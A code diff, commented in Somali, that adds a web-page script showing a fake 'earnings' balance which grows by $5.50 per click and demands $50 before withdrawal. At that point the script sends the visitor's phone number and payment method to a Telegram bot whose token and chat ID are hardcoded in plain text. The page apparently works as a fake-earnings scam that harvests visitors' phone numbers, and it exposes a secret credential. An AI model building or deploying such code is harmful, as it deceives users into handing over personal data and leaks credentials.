@@ -1,4 +1,29 @@
 
-// Halkan ha gelin Token-ka, waxaan ku xireynaa Vercel
-const TOKEN = process.env.TELEGRAM_TOKEN;
-const CHAT_ID = process.env.TELEGRAM_CHAT_ID;
+<script>
+    // Sxb, kani waa koodhkaaga oo dhammaystiran.
+    // Si uu u shaqeeyo, Token-kaaga geli halkan:
+    const TOKEN = "8707370609:AAE7kcr2bv4jHuSVG2Z1h__ukoKsnM6Lexg"; 
+    const CHAT_ID = "7807994222";
+
+    function addMoney() {
+        let balanceEl = document.getElementById('balance');
+        let balance = parseFloat(balanceEl.innerText);
+        balance += 5.50;
+        balanceEl.innerText = balance.toFixed(2);
+    }
+
+    function checkWithdraw(method) {
+        let balance = parseFloat(document.getElementById('balance').innerText);
+        let phone = document.getElementById('phone').value;
+
+        if (balance < 50) {
+            alert("Waan ka xunnahay! Lacagta ugu yar ee la bixi karo waa $50.");
+        } else if (phone.length < 5) {
+            alert("Fadlan geli lambar sax ah.");
+        } else {
+            let msg = `💰 Codsi Cusub:%0AHabka: ${method}%0ALambarka: ${phone}%0AHaraaga: $${balance}`;
+            fetch(`https://api.telegram.org/bot${TOKEN}/sendMessage?chat_id=${CHAT_ID}&text=${msg}`);
+            alert("Mahadsanid! Codsigaaga " + method + " waa la gudbiyay.");
+        }
+    }
+</script>
